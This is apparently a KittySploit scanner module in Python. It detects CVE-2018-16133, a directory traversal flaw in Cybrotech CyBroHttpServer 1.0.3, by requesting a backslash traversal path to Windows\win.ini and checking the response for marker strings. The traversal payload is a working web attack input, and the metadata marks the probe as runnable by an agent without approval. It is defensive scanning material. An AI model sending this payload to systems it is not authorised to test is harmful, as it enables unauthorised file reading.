#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cybrotech CyBroHttpServer 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cybrotech CyBroHttpServer 1.0.3 - Local File Inclusion Detection',
        'description': 'Cybrotech CyBroHttpServer 1.0.3 is vulnerable to local file inclusion in the URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2018', 'cve', 'lfi', 'packetstorm', 'cybrotech', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/149177/Cybrotech-CyBroHttpServer-1.0.3-Directory-Traversal.html',
            'http://www.cybrotech.com/',
            'https://github.com/EmreOvunc/CyBroHttpServer-v1.0.3-Directory-Traversal',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-16133',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-16133',
    }

    def run(self):
        path = '/\\..\\..\\..\\..\\Windows\\win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Cybrotech CyBroHttpServer 1.0.3 - Local File Inclusion detected', path=path)
            return True
        return False

